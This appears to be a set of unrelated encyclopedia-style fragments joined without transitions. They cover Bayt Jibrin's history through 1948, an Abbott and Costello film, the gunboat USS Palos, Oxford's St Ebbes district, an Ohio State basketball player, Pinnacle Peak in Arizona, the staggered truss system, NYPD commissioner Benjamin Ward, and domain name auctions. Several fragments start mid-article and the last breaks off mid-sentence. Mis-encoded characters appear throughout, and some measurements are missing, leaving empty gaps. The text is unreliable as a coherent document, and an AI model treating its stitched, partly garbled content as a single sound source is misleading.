area.Sharon, 1999, pp. 123-124 In 1896 the population of Bet dschibrin was estimated to be about 1,278 persons.Schick, 1896, p. 126 British Mandate era After the British Army captured Palestine from the Ottomans in 1917‚Äì1918, Bayt Jibrin resumed its role as an important town in the District of Hebron. The population was entirely Muslim, and had two schools, a medical clinic, a bus and a police station. The town's inhabitants cultivated grain and fruit, and residents from nearby towns flocked to its weekly market or souk. During the winter of 1920-1921 there was a severe outbreak of malaria. 157 villagers (one-sixth of the population) died with the mortality rate in the district reaching 68 per 1,000. Crops remained unharvested due to lack of people strong enough to work in the fields. The new British regime began a program of sealing open wells, improving drainage and distributing quinine across Palestine.An Empire in the Holy Land: Historical Geography of the British Administration in Palestine, 1917-1929 Gideon Biger, St. Martin's Press, 1994 In the 1922 census of Palestine conducted by the British Mandate authorities, Bayt Jibrin had a population of 1,420, all Muslim,Barron, 1923, Table V, Sub-district of Hebron, p. 10 increasing the 1931 census to 1,804, still all Muslim, in a total of 369 houses.Mills, 1932, p. 28 On 10 January 1938, during the Arab National revolt of 1936-1939 J. L. Starkey, a well-known archaeologist, was killed by a group of armed Arabs on the track leading from Bayt Jibrin to Hebron.UN Archives REPORT by His Majesty's Government in the United Kingdom of Great Britain and Northern Ireland to the Council of the League of Nations on the Administration of Palestine and Trans-Jordan for the year 1938 In the 1945 statistics Bayt Jibrin had 2,430 Muslim inhabitants, with a total of 56,185 dunams of land. Of this, 2,477 dunums were irrigated or used for plantations, 31,616 dunams used for cereals,Village Statistics, Government of Palestine. 1945. Quoted in Hadawi, 1970, p. 93 while 287 dunams were built-up (urban) areas. Bayt Jibrin was in the territory allotted to the Arab state under the 1947 UN Partition Plan. 1948 war The ruins of Bayt Jibrin, 2005 The First Battalion of the Egyptian Army were ordered to take up position in Bayt Jibrin during the second half of May during the 1948 Arab- Israeli War. At the same time, The New York Times correspondent reported that thousands of Jaffa's inhabitants had fled inland, including \\"large numbers\\" to the Bayt Jibrin area.NYT, 4/5/48, quoted in Khalidi, 1992, pp. 209-210. In October 1948, the Israeli Army (IDF) launched Operation Yoav, which differed from operations three months earlier, as the IDF was now equipped with aircraft, artillery, and tanks. On October 15‚Äì16, the IDF launched bombing and strafing attacks on a number of towns and villages, including Bayt Jibrin.Morris, 2004, p. 465 According to Morris, the towns caught in the fighting were neither psychologically nor defensively prepared for aerial strikes, and Israeli Air Force bombing of Bayt Jibrin on October 19 set off a \\"panic flight\\" of residents from the town.Morris, 2004, pp. 414, 468 On October 23, a United Nations-imposed ceasefire went into effect, however, there was an IDF raid on the neighboring police fort on the night of October 24, which resulted in more villagers fleeing Bayt Jibrin.Morris, 2004, p. 468 Israeli troops from the Giv'ati Brigade then occupied Bayt Jibrin and its police fort on October 27. In 2008, a former resident of the town who was eight months old at the time of the raid, described his family's ordeal as follows: > In the 1948 war, the village was attacked by Israeli military units and > bombed by Israeli aircraft. By that time, Beit Jibreen already hosted many > refugees from neighboring villages. The fighting and bombing frightened the > people. They escaped the fighting and sought shelter in the surrounding > hills. [My] family found protection in a cave 5 km east of the village. They > had left everything in their home, hoping to return after a few days when > the attack would be over. The Israelis, however, did not allow them to > return. Several men of Beit Jibreen were killed when they tried to go back. In 1949, kibbutz Beit Guvrin, was founded on the former town's lands. The excavated areas of the successive Judahite, Hellenistic, Roman-Byzantine and Crusader towns have been included in a large Israeli national park with major points of attraction for tourists. There is little focus on any traces of Arab presence within the park, the period from the 7th century onward receiving little attention.

The village was northwest of Hebron. The average elevation of Bayt Jibrin is above sea level. Nearby localities included the depopulated villages of Kudna to the north, al-Qubayba to the southwest, al-Dawayima to the south and the existing Palestinian towns of Beit Ula to the east and Idhna to the southeast. Historically, it was located on the main road between Cairo and Hebron, via Gaza.Sharon, 1999, p. 117 In 1945, Bayt Jibrin's total land area was , 98% of which was Arab-owned. The town's urban area consisted of , with of cultivable land and of non-cultivable land. 54.8% of the town's land was planted with cereal crops, 6.2% with olives and 4.4% with irrigated crops. The Bayt Jibrin region contains a large number of caverns, both natural formations and caves dug in the soft chalk by inhabitants of the region over the centuries for use as quarries, burial grounds, animal shelters, workshops and spaces for raising doves and pigeons. There is estimated to be 800 such caverns,Gems in Israel: Bell Cave at Beit Guvrin many linked by an underground maze of passageways. Eighty of them, known as the Bell Caves, are located on the grounds of the Beit Guvrin National Park.Israel Nature and National Parks Protection Authority Archaeology Today many of the excavated areas of Maresha and Beit Guvrin can be visited as part of the Israeli Beit Guvrin-Maresha National Park. Furthermore, the Archaeological Seminars Institute, under the license of the Israel Antiquities Authority, conducts excavations of Maresha's many quarried systems, and invites visitors to participate. In 1838, the American Bible scholar Edward Robinson visited Bayt Jibrin, and identified it as ancient Eleutheropolis.Biblical researches in Palestine, 1838-52. A journal of travels in the year 1838. P. 57ff: Eleutheropolis 1856, The remains of the city of Maresha on Tell Sandahanna/Tel Maresha were first excavated in 1898-1900 by Bliss and Macalister, who uncovered a planned and fortified Hellenistic city encircled by a town wall with towers. Two Hellenistic and one Israelite stratum were identified by them on the mound. Between 1989‚Äì2000, large-scale excavations were held by the Israel Antiquities Authority (IAA) under the direction of Prof. Amos Kloner and conducted mainly in the Lower City of Maresha, concentrating both on the surface and on the subterranean complexes. Excavations continued in several subterranean complexes between 2001 and 2008. The largely preserved remains of the amphitheater built by the Romans were excavated by Kloner. Among other unique finds was a Roman bath that has been confirmed to be the largest in Israel and the Palestinian territories. Many of the ancient city's olive presses, columbaria and water cisterns can still be seen. Less than 10 percent of the caves on Tel Maresha have been excavated. The ruins of three Byzantine-era churches are located in Bayt Jibrin. A church on a northern hill of the town, later used as a private residence, had elaborate mosaics depicting the four seasons which were defaced in the 1948 Arab-Israeli War. A church south of the town, known as Khirbet Sandahanna, was dedicated to Saint Anne. The New Testament does not give any information about the mother of the Virgin Mary, but the widely circulated apocryphal Gospel of James gives her name as Anne, and her birthplace as Bethlehem. In another Christian tradition though, Bayt Jibrin is the birthplace of Saint Anne.Sharon, 1999, p. 14 The initial Byzantine church was rebuilt by Crusaders in the 12th century. Today, the apse with its three arched windows and half-dome ceiling are still intact.Eleutheropolis - (Bayt Jibrin) Studium Biblicum Franciscanum - Jerusalem. 2000-12-19. The wider area of the Shfela has been inhabited for much longer. Excavations were conducted by the Israel Antiquities Authority (IAA) about 12 kilometres northeast from Bayt Jibrin at a site located on the same wadi, Nahal Guvrin, near moshav Menuha. The IAA has unearthed there artifacts from a village believed to be 6,500 years old, placing it at the end of the Stone Age or at the beginning of the Chalcolithic or \\"copper-and-stone age\\". The finds include pottery vessels and stone tools, among them flint sickle blades, cultic objects, clay figurines of horned animals, ceramic spindle whorls and animal bones belonging to pigs, goats, sheep and larger herbivores. The inhabitants probably chose this area due to the arable land and copious springs flowing even in the rainless summer months. Archaeologists believe the villagers grew grain, as indicated by the sickle blades and the grinding and pounding tools, and raised animals that supplied milk, meat and wool, as attested to by the spindle whorls. The settlement was small in scope, approximately 1.5 dunams, but there is evidence of bartering, based on the presence of basalt vessels and other lithic objects brought to the site from afar. Demographics During the Roman period, Bayt Jibrin had a mixed population of Jews, Christians and pagans. Under Muslim rule, Islam gradually became the dominant religion and by the 20th century, the entire population was Muslim. In Ottoman tax records from 1596, the town had a population of 275 inhabitants. In the late 19th century its population reached 900, while in 1896 the population was estimated to be about 1,278 persons. In 1912 it was estimated to be about 1,000,Baedecker, in his handbook, 1912, p.116-117, quoted in Khalidi, 1992, p. 209 and to 1,420 in the next decade. According to the 1931 census of Palestine, Bayt Jibrin's population was 1,804. A 1945 land and population survey by Sami Hadawi reported a sharp increase to 2,430. The general growth pattern over every 9‚Äì11 years from 1912 to 1945 was around 400‚Äì500. In 1948, the projected population was 2,819. The number of refugees from Bayt Jibrin, including their descendants, was estimated to be 17,310 in 1998. Many live in the al-'Azza (also called Bayt Jibrin) and Fawwar camps in the southern West Bank. Culture Bride's wedding attire from Bayt Jibrin, with the shambar expanded on the wall, exhibition at Oriental Institute, Chicago Embroidery Bayt Jibrin, together with Hebron and the surrounding villages, was known for its fine Palestinian embroidery.Palestinian costume before 1948 - by region Palestine Costume Archive. Retrieved on 01.15.2008. An example is a woman's jillayeh (wedding dress) from Bayt Jibrin, dated about 1900, in the Museum of International Folk Art (MOIFA) collection in Santa Fe, New Mexico. The dress is made of handwoven indigo linen with long, pointed wing-sleeves. The qabbeh (\\"chest-piece\\") is embroidered with the qelayed pattern; the maya (\\"water\\") motif, el-ferraneh (\\"the bakers wife\\") pattern, and the saru (\\"cypress\\") motif. The side panels are also covered with cross- stitch embroidery in a variety of traditional patterns.Stillman, 1979, p.58-59, illustrated Also on show is a late 19th-century shambar (large veil) from Bayt Jibrin worn at weddings and festivals. It is made of embroidered handwoven black silk with a separate heavy red silk fringe.Stillman, 1979, p.66, illustratedStillman, 1979, illustrated plate 15, facing p.33 A woman wore the shambar mainly on her wedding day, positioned so that when she covered her face the embroidered end would show. Another item in the collection is a headdress (iraqiyeh) embroidered with cross-stitch and decorated with Ottoman coins minted in AH 1223 (1808), as well as Maria Theresa coins. The iraqiyeh was worn by married women and elaborate pieces were passed down as family heirlooms. Long embroidered headbands made of cotton hanging from both sides were wrapped around the woman's braids to facilitate the bundling of her hair, then secured to the back of the headdress.Weir, 1989, p. 184 Shrines Maqam of Sheikh Tamim, traditionally taken to be Tamim al-DariPetersen, 2001, p. 122 In Islamic tradition, Bayt Jibrin is the burial place of the sahaba (companion) of the prophet Muhammad, Tamim al-Dari, who was famously known for his piety and briefly served as the Governor of Jerusalem in the late 7th century. Al-Dari and his family were granted trusteeship over the Hebron Hills, including Bayt Jibrin, and were assigned as the supervisors of the Cave of the Patriarchs (Ibrahimi Mosque) in Hebron. His sanctuary is the most venerated site in Bayt Jibrin, located just northwest of it. Until the present day, al-Dari's sanctuary has been a place of local Muslim pilgrimage.Sharon, 1999, pp. 140-141 Other Islamic holy sites in the village include Maqam for a local shaykh named Mahmud and a tomb for a shaykha (female religious figure) named Ameina.Abu-Sitta, 2007, p. 117 See also * Beit Guvrin-Maresha National Park * Eleutheropolis * Ibelin, Crusader castle at Tel Yavne on the Mediterranean coastal plain * Justus of Eleutheropolis * Kibbutz Beit Guvrin * List of Arab towns and villages depopulated during the 1948 Arab-Israeli War * List of villages depopulated during the Arab-Israeli conflict * Maresha * National Parks of Israel * Peter of Eleutheropolis * Zebennus References Bibliography    * Search for \\"Bait Jibreen\\" (Spring 1849: pp.176, 178-182, stay at Bait Jibreen, at the house of the brother of the sheik)(Spring 1853, note 182: fighting in Bayt Jibreen, at least 35 killed.)

Sylvan Simon and starring the comedy team of Abbott and Costello. Made by Metro-Goldwyn-Mayer, it was produced by Martin A. Gosch. Plot A barber, Buzz Curtis (Bud Abbott), and a porter, Abercrombie (Lou Costello), work for a Hollywood salon. They are sent to the office of agent Norman Royce (Warner Anderson) to give him a haircut and a shoeshine. On the way there they run into former co-worker Claire Warren (Frances Rafferty), who is about to star as the lead in a new musical. At the same time her co-star Gregory LeMaise (Carleton G. Young), whose fame is dwindling, arrives and invites her to join him at lunch. She declines, which angers him. While at the agent's office Buzz and Abercrombie witness LeMaise enter and declare to Royce that he cannot work with Claire. Royce, who has just seen a young singer, Jeff Parker (Robert Stanton) audition, fires LeMaise and offers the job to Parker. This causes LeMaise to change his mind, and Royce does as well, giving LeMaise his job back. Buzz and Abercrombie quickly switch careers and become Parker's agents, and head to the studio's chief, Mr. Kavanaugh (Donald MacBride), to find a role for Parker. Unfortunately, when they meet up with Kavanaugh it's because they just crashed their car into his at the studio gate. Kavanaugh bans them from the lot, but they manage to sneak back in with a group of extras. Once inside they find themselves at the wardrobe department and Buzz gets dressed as a cop and Abercrombie as a tramp. They use their newfound disguises to roam the lot. Later, Buzz and Abercrombie try to help Parker get the role by getting LeMaise out of the picture by trying to start a fight with him. Their plan is to photograph him hitting Abercrombie and then having him arrested. The plan goes off without a hitch until Abercombie falls overboard after being hit and is feared drowned. LeMaise decides to hide, and Parker is given the role in his place. LeMaise eventually discovers that Abercrombie is still alive and chases him around the backlot. LeMaise eventually is caught, and Claire and Parker become famous when the film is successful. Subsequently, Buzz and Abercrombie become big-time agents in Hollywood.

During production, Abbott and Costello returned to Universal Studios on May 13 for reshoots on The Naughty Nineties. This is the last of three feature films that Abbott and Costello made on loan to Metro- Goldwyn-Mayer while under contract to Universal; the other two features were Rio Rita and Lost in a Harem. Many stars appear in the film as themselves, such as Lucille Ball, Rags Ragland, Preston Foster, and a young Dean Stockwell. Routines performed * Insomnia is one of the routines that Abbott and Costello perform. Costello is unable to fall asleep, so Abbott gives him a record that is guaranteed to put anyone to sleep. However, no one is around to turn it off, and when the needle reaches the end, it starts skipping, which wakes him. Abbott agrees to stay awake to turn it off when it is over, but falls under the spell of the record and goes to sleep himself. They try again, this time with cotton in Abbott's ears (a sequence that was used in the MGM compilation film, (That's Entertainment, Part II). When this also fails, Costello ties a string from his foot to the record player. The thought is when he falls asleep, his foot will drop shutting off the machine, but instead it turns on the radio, which blasts a loud march! Reception Bosley Crowther of The New York Times wrote: \\"Among the real rib-tickling sketches in this film the two high spots are Costello's schooling in the tonsorial art and his desperate battle to overcome insomnia. During these interludes his brilliant pantomimic talents are brought into full play. As for the rest, well, even half a laugh is better than none.\\" Variety wrote: \\"An Abbott and Costello picture may not be an artistic triumph, but the duo certainly try hard enough to make audiences laugh. Their latest, 'Abbott and Costello in Hollywood,' is no exception; it should do fairly good business.\\" Harrison's Reports wrote that the film \\"should more than satisfy those who respond easily to [Abbott & Costello's] particular brand of slapstick humor.\\" Home media Warner Home Video released the film on DVD November 21, 2006 with Lost in a Harem (1944). In popular culture During the third and fourth seasons of the television sitcom Ellen, a Spanish language poster for the film is shown hanging in Ellen's apartment.

She was named for Palos de la Frontera in Spain, the place where Christopher Columbus started the first voyage to America. Palos was built by James Tetlow, Chelsea, Massachusetts, in 1865 and was put into service as yard tug at the Boston Navy Yard the following year. Placed in ordinary in 1869, the tug was converted to a gunboat and commissioned 11 June 1870, Lieutenant C. H. Rockwell in command. Departing Boston 20 June for the Asiatic Station, Palos steamed across the Atlantic Ocean and through the Mediterranean Sea, becoming the first American warship to transit the Suez Canal 11‚Äì13 August, and arrived at Singapore, via Aden and Ceylon, 25 September. Following a brief stay at that port, the gunboat put out for Hong Kong and for the next 22 years operated on the China and Japan coasts and inland waters. In May 1871, the warship sailed from Shanghai for Nagasaki, Japan, and thence Korea as part of the Asiatic Squadron under Rear Admiral John Rodgers carrying U.S. Minister to China Frederick Low on a diplomatic mission to the ‚ÄúHermit Kingdom.‚Äù While engaged in surveying the Salee River 1 June, she was fired upon by a Korean fort, two men from the squadron being wounded before return fire stopped the attack. Admiral Rodgers waited ten days for an official apology and then ordered Palos, gunboat Monocacy, and a 650 man landing party into action, the two warships supporting an assault and capture of the main Korean fort 10 June and the taking of four others the next day. The squadron departed the Korean coast 3 July without renewing negotiations. Palos continued her operations on the Asiatic Station into 1891, cruising the Chinese and Japanese coasts, visiting the open treaty ports and making occasional voyages up the Yangtze and Canton Rivers. From June to September 1891, anti-foreign riots up the Yangtze forced the warship to make an extended voyage as far as Hankow, 600 miles upriver.

St Ebbes is a district of central Oxford, England, southwest of Carfax. St Ebbes Street runs south from the western end of Queen Street. __TOC__ Overview The area takes its name from the parish church of St Ebbe's, dedicated to Saint √Übbe the Elder. The name was first recorded in about 1005, when the church and other nearby property was granted to Eynsham Abbey.Victoria County History of Oxfordshire: Medieval Oxford The parish extended to the River Thames. By 1279 the area was known for property inhabited by the poorer townsfolk, and remained so until the middle of the 20th century. In 1818 gas works were built on the north bank of the River Thames in St Ebbes, to supply the city of Oxford with gas. St Ebbes expanded significantly in the 19th century, and by 1882 there was no room to expand the gas works, and new gasholders had to be built on the south bank of the river. A railway bridge (the Gasworks Bridge) was built across the river to connect the gas works to the Great Western Railway line. The gas works were closed in 1960.Old Oxford: St Ebbe's: The Gasworks The area was redeveloped between the 1950s and the 1980s.Curl, 1977, pages 107‚Äì132Sherwood & Pevsner, 1974, page 328 A new main road, Thames Street, was built through the area in 1968. Between 1970 and 1972 the Westgate Shopping Centre was built in St Ebbes, and much of the rest of the area became car parks. Only a few residential properties remain to the north of Thames Street. There is a small housing estate between Thames Street and the river, known as St Ebbes by the River. St Ebbe's Street runs south from Queen Street past Pembroke Street (on the right), to Brewer Street (on the right). There the street becomes \\"Littlegate\\". St Ebbe's Church of England parish church in Pennyfarthing Place, on the corner with St Ebbes Street is now a conservative evangelical congregation. St Ebbe's Church of England Primary School is south of the river, outside St Ebbe's parish. The Victorian photographer Henry Taunt was born at Penson's Gardens, St Ebbes, on 14 June 1842.

Born in Columbus, Ohio, Roberts played for Ohio State University's 1960 NCAA champions, and later played in the NBA for the Syracuse Nationals before going into coaching. Roberts also played with Hall-of-Famers Jerry Lucas, John Havlicek, and Bobby Knight. Coach Fred Taylor also was a Hall-of-Famer for Ohio State.1960 National Championship Team Honored at Halftime of Minnesota Game  Basketball career  He starred at Columbus East High School under coach Jackie Moore as a 6'6\\", 220-lb forward. Future OSU teammate Mel Nowell also starred for Columbus East. Roberts ended up at Ohio State when schools like Georgia Tech and Ohio University advised they had curfew rules for blacks like Roberts. The Buckeyes had few black players at that time, but coaches Floyd Stahl and Fred Taylor made him feel welcome. Roberts, fellow senior Dick Furry, and Larry Siegfried were returnees that were joined by super sophomores Lucas, Havlicek, and Nowell in 1960. That team lost just three games, one to Utah and star center Billy McGill, one to Adolph Rupp's Kentucky team, where Roberts and Nowell endured racial taunts, and one to Indiana after the Buckeyes had won the Big Ten title. Roberts was a senior co-captain who provided veteran leadership to the sophomore stars on that team. All five starting Buckeyes‚ÄîRoberts, Havlicek, Lucas, Siegfried, and Nowell‚Äîwere drafted to play in the NBA, a rare feat considering there were then just nine NBA teams. Roberts did play for Ohio State in the 1960 US Olympics trials, but drew little attention away from his teammates and the many AAU players who came to take their place on that team regardless of performance. Roberts was drafted in the third round by the NBA's Syracuse Nationals. He was a reserve at both forward positions behind stars Dolph Schayes, Lee Shaffer, and Johnny Kerr. He played with the Nats three seasons, with the Nats making the playoffs each year under coach Alex Hannum. The Nats were very good, but could not get past the Boston Celtics in their division. Feeling that his race was limiting his opportunities, Roberts declined to stay with the team when they became the Philadelphia 76ers in 1963. Roberts returned to his hometown of Columbus, Ohio for the 1966-67 season as the player/manager for the Columbus Comets of the newly formed and short lived North American Basketball League (NABL) where he played with former East High and Ohio State teammate Mel Nowell as well as former Ohio State alumni Dick Reasbeck, Gary Bradds, and Jim Doughty. Also on the team was a guard from Kent State named Gene Michael who at the time was a member of the Columbus Jets baseball team, the minor league affiliate of the Pittsburgh Pirates. Michael would go on to be a player, and later General Manager for the New York Yankees. Roberts did return to play for the Kentucky Colonels of the ABA for one season in 1967, the ABA's first year. He was disappointed to again be a reserve.  Coaching career  He later became an assistant coach for Western Michigan in the Mid-American Conference, then Iowa in the Big Ten, before being an assistant for the NBA's Golden State Warriors and coach Al Attles for five years. The Warriors, led by MVP Rick Barry, won the NBA championship in 1975. Roberts coached the Warriors to their fourth win in the NBA finals against the Washington Bullets after Attles was ejected from the game.

The peak rises to an elevation of . It is located within the Pinnacle Peak Park, operated by the City of Scottsdale Park District. Part of the Sonoran Desert, the park is home to a variety of native desert flora and fauna. Hikers utilize a 1.75 mile trail to explore the area, though rock climbing skills are needed to reach the summit.  History  The area around Pinnacle Peak was used by the Hohokam for hunting and food gathering. Later, settlers began to use the area for ranching and mining, with homes gradually being built within sight of Pinnacle Peak. Pinnacle Peak and its surrounding area became a part of the Arizona State Trust Land. In the 1980s, the area was annexed into Scottsdale and was established as a park. In 1994, were sold to a housing developer in exchange for the funding and construction of the park's main trail. After being closed for six years due to the development, the park reopened on April 20, 2002.. From the Google News Archive.  Trail  Pinnacle Peak Trail Map A 1.75 mile trail leads visitors around the peak. As it is not a loop trail, hikers need to return the way they came, making for a 3.5 mile round trip hike. The park has provided benches along the trail along with mileage and informational signs. The trail utilizes many switchbacks; the elevation at the trailhead is , with the lowest point at , and the highest point measuring . Half a mile from the trail head, the trail opens up to a scenic look-out called \\"Grandview.\\"  Summit climb  Pinnacle Peak summit is approached from the east side, from a spur of the main trail labeled \\"rock climbing access\\". The most popular summit route itself is called the \\"South Crack\\". South Crack route is three pitches of trad climbing. All pitches have belay anchors at the top. The summit is flat and has large belay anchors and rap rings. The second and third pitch can be combined into one pitch as the third pitch is very short, and the belay station is somewhat cramped (located between two boulders that form the entrance of a tunnel that extends through to the north side of the peak). When descending, rappel to the right (east) of the second pitch, down a large, flat face to the top of the first pitch. Rappel down the first pitch or downclimb the route.  Wildlife  Pinnacle Peak is home to a diverse variety of wildlife. According to the Scottsdale Park District, the park \\"is an ideal habitat for a variety of native plants such as saguaros, cholla cactus, creosote plants, and for creatures such as bobcats, gila monsters and western diamondback rattlesnakes.\\" Mammals spotted on Pinnacle Peak include woodrats, mountain lions, coyotes, grey foxes, mule deer, rock squirrels, javelina, and desert cottontail. Reptiles recorded on the peak include gila monsters, desert tortoise, chuckwalla, desert spiny lizards, and a variety of snakes, including western diamondback rattlesnakes, black-tailed rattlesnakes, gopher snakes, common kingsnakes, coral snakes, and coachwhips.

The system consists of a series of story-high trusses spanning the total width between two rows of exterior columns and arranged in a staggered pattern on adjacent column lines.http://aisc.org/Content/ContentGroups/Documents/Engineering_Journal4/263_EJ_scalzi.pdf William LeMessurier, the founder Cambridge, Massachusetts engineering firm LeMessurier Consultants has been credited in developing this award winning systemhttp://www.aisc.org/Content/ContentGroups/Modern_Steel_Construction3/March_1999_Issue/9903_news.pdf as part of his research at the Massachusetts Institute of Technology. History The staggered truss system came about due to sponsored research at Massachusetts Institute of Technology's Departments of Architecture and Civil Engineering in the 1960s by U.S. Steel. The research attempted to achieve the same floor-to-floor height with steel as you could with flat plate concrete. The system was presented at the 1966 AISC Conference (the predecessor to the current North American Steel Construction Conference). Additional benefits discovered were high resistance to wind loads and versatility of floor layout with large column-free areas. It has been used with on a number of LeMessurier Consultants work in hotels including Lafayette Place Hotel in Boston and the Aladdin Hotel in Las Vegas. Other locations that use this system include the Resorts International Hotel in Atlantic City, New Jersey,Erecting the Staggered- truss System: A View from the Field Embassy Suites hotel in New York City,Architectural Record |Benefits of Staggered Truss Systems in Multi- Story Residential and Other Applications Baruch College Academic Center in New York City, Trump Taj-Mahal in Atlantic City NJ, and the Renaissance Hotel in Nashville TN Description The staggered truss system for steel framing is an efficient structural system for high-rise apartments, hotels, motels, dormitories, and hospitals. The arrangement of story-high trusses in a staggered pattern at alternate column lines provide large column-free areas for room layouts. These column free areas can be utilized for ballrooms, concourses, and other large areas. The staggered truss structural system consists of story-high steel trusses placed on alternating column lines on each floor so that the long axis of one truss is always between the trusses on the floor below. The system staggers trusses on a 12‚Äô module, meaning that on any given floor the trusses were 24‚Äô apart. The interaction of the floors, trusses, and columns makes the structure perform as a single unit, thereby taking maximum advantage of the strength and rigidity of all the components simultaneously. Each component performs its particular function, totally dependent upon the others for its performance. The total frame behaves as a cantilever beam when subjected to lateral loads. All columns are placed on the exterior wall of the building and function as the flanges of the beam, while the trusses which span the total transverse width between columns function as the web of the cantilever beam. While earlier staggered truss systems utilized channels for web diagonals and verticals, today most of the trusses are designed with hollow structural sections (HSS) for vertical and diagonal members because they are more structurally efficient and easier to fabricate. The trusses are fabricated with camber to compensate for dead load and are transported to the site, stored and then erected‚Äîgenerally in one piece. Fabrication of this type of structure requires certified welders and overhead cranes capable of lifting 10 to 15-ton trusses and columns for projects up to 20 stories. Fabrication involves the following components: Columns, Spandrel Beams, Trusses, Secondary Columns & Beams and the Floor System. Advantages *Large clear span open areas for ballrooms, or other wide concourse are possible at the first floor level, because columns are located only on the exterior faces of the building. This allows for spaces as much as 60 feet in each direction with columns often only appearing on the perimeter of a structure. This also increases design flexibility especially for atrium placement and open space floor plans. * Floor spans may be short bay lengths, while providing two column bay spacing for room arrangements. This results in low floor-to-floor heights. Typically, an 8'-8\\" floor-to-floor height is achieved. * Columns have minimum bending moments due to gravity and wind loads, because of the cantilever action of the double-planar system of framing. * Columns are oriented with their strong axis resisting lateral forces in the longitudinal direction of the building. * Maximum live load reductions may be realized because tributary areas may be adjusted to suit code requirements. * Foundations are on column lines only and may consist of two strip footings. Because the vertical loads are concentrated at a few column points, less foundation formwork is required. * Drift is small, because the total frame is acting as a stiff truss with direct axial loads only acting in most structural members. Secondary bending occurs only in the chords of the trusses. * High strength steels may be used to advantage, because all truss members and columns are subjected, for all practical purposes, to axial loads only. * A lightweight steel structure is achieved by the use of high strength steels and an efficient framing system. Since this reduces the weight of the superstructure, there is a substantial cost savings in foundation work. * Faster to erect than comparable concrete structures. Once two floors are erected, window installation can start and stay right behind the steel and floor erection. No time is lost in waiting for other trades, such as bricklayers, to start work. Except for foundations, topping slab, and grouting, all \\"wet\\" trades are eliminated. * Fire resistance; steel is localized to the trusses, which only occur at every 58-to-70-feet on a floor, so the fireproofing operation can be completed efficiently. Furthermore, the trusses are typically placed within demising walls and it is possible that the necessary fire rating can be entirely by enclosing the trusses with gypsum wallboard. Finally, if spray-on protection is desired, the applied thickness can be kept to a minimum due to the compact nature of the truss elements.

Early life Ward was one of 11 children and was born in the Weeksville section of Brooklyn, New York. He attended Brooklyn Automotive Trades High School, graduating in 1944. Drafted into the Army after high school, he served as a military policeman and a criminal investigator with the Army in Europe for two years. Career in the NYPD Ward entered the NYPD on June 1, 1951 as a patrolman, becoming the first black officer assigned to Brooklyn's 80th Precinct, where he faced resentment from both white residents and white fellow cops. He wasn't assigned a locker at the precinct, forcing him to dress at home and ride the New York City Subway to work in his uniform for three years. During the next 15 years in uniform, he rose through the ranks to lieutenant, serving in the Patrol Division, Juvenile Aide Division, Detective Division, and Legal Bureau. His rise was aided, in part, by his after-work studies at Brooklyn College and Brooklyn Law School (class of '65) that earned him undergraduate and law degrees‚Äîinvariably with top honors. He eventually served as special legal counsel to Police Commissioner Howard R. Leary. Ward left the uniformed ranks to become executive director of NYPD's Civilian Complaint Review Board in 1966. Two years later he was named a Deputy Police Commissioner of Trials, serving as chief hearing officer in all departmental disciplinary matters. Later he became Deputy Commissioner of Community Affairs with responsibilities for the Youth Aid Division and the Auxiliary Forces Section. Mayor John V. Lindsay designated Ward as Traffic Commissioner in 1973. Under his leadership, uniformed traffic controllers from his agency took on street duties, thereby freeing hundreds of police officers from traffic direction posts. The following year he headed up what is now known as the Criminal Justice Agency that performs bail risk evaluations. Three years later, Mayor Edward I. Koch named him to the first of three posts in his administration: Chief of the New York City Housing Authority. On August 13, 1979, he was designated to run the New York City Department of Corrections. He served as commissioner until December 31, 1983, when he accepted an appointment by Koch as New York City Police Commissioner. Ward was sworn in by Mayor Koch as the city‚Äôs thirty- fourth Police Commissioner on January 5, 1984. He was the first African American to hold that position. Ward oversaw the nation's largest police department during increased drug use, ex. crack and a sharp increase in related crime, including drug related murders. Ward's ownership also coincided with a period of culminating in the Tompkins Square Park Riot. Criticism of response to Philip Cardillo's murder :See 1972 Harlem Mosque incident On April 14, 1972, Patrolman Philip Cardillo and Vito Navarra responded to a \\"10‚Äì13\\" call at 102 E. 116th St. in Harlem, which was a Nation of Islam mosque where Malcolm X used to preach. Upon arriving inside, they were ambushed by 15 to 20 men, one of whom, according to the ballistics report, shot Cardillo at point blank range. Most of the police were forced out of the mosque and locked out, leaving a dying Cardillo and officers Victor Padilla and Ivan Negron locked inside. Police eventually managed to break down the door and witnessed a man named Louis 17X Dupree standing over Cardillo with a gun in hand. Before Dupree could be taken into custody, however, Louis Farrakhan and Charles B. Rangel arrived at the scene, threatening a riot if Dupree was not released. Just as the police forensics unit was about to seal off the crime scene, they were ordered out of the mosque by the police brass. Outside a mob had overrun the street and overturned a police cruiser. Ward released the 16 suspects, an action for which he was later criticized by a grand jury. He also apologized to the minister, Louis Farrakhan, for violating an agreement that the police would not enter the mosque. Life after retirement Ward retired as NYC Police Commissioner on October 22, 1989. After his retirement, he remained active, teaching and serving on various boards until failing health forced him to curtail such endeavors. He served as an Adjunct Professor of Law at Brooklyn Law School, an Adjunct Professor of Corrections at the John Jay College of Criminal Justice, and an adjunct professor of the Hudson Valley Community College in Troy. Ward's personal papers are housed in the Lloyd Sealy Library Special Collections at John Jay College of Criminal Justice. Death Benjamin Ward died on June 10, 2002 at the age of 75.

A Drop registrar offers sales of expiring domains; but with a domain auction there is no need to wait until (and if) a current owner allows the registration to lapse before purchasing the domain you most want to own. Domain auction sites allow users to search multiple domain names that are listed for sale by owner, and to place bids on the names they want to purchase. As in any auction, the highest bidder wins. The more desirable a domain name, the higher the winning bid, and auction sites often provide links to escrow agents to facilitate the safe transfer of funds and domain properties between the auctioning parties. Popularity A number of factors have contributed to the rise in popularity of the domain name auction. The personalization of the web resulted in domain names being purchased by more private individuals and businesses than originally anticipated; and as a result there was also a rise in speculation and domain name warehousing. Anticipating a growing need for a targeted top-level domain name, domainers began to purchase names with an eye towards selling them at a later time. The advancing field of Search Engine Optimization (SEO) has also increased the desire to own a domain name that accurately reflects the subject matter of the web site. Search Engine Optimization has put pressure on individuals and companies to consider how accurate domain names relate to their content. Therefore, they need to make sure their domain name closely relate to the content presented; allowing researchers to put the least possible energy and resources into quickly finding domain names with accurate information. Domain name auctions have become more popular when buyers and sellers are looking for specific domain names to achieve high Search Engine Optimization. Another factor why more and more people are purchasing expired domains is solely for the traffic they generate. Search Engine Optimization experts use traffic generated to sell on to make a profit. They also claim having more visitors travelling from expired domains to a website can improve Search Engine Results Pages (SERPs) and Alexa rankings which both play an important role in Search Engine Marketing (SEM). Domain auction website A domain auction website provides the technology through which users can list or purchase multiple domains easily and conveniently. Domain parking, once the most efficient method for advertising a domain for sale, allowed a domain owner to post the availability of the domain on a page, hoping someone who was interested in that name would surf through and see it listed for sale. With the development of the domain auction, multiple users can list multiple domains all in the same place, thereby exposing them to 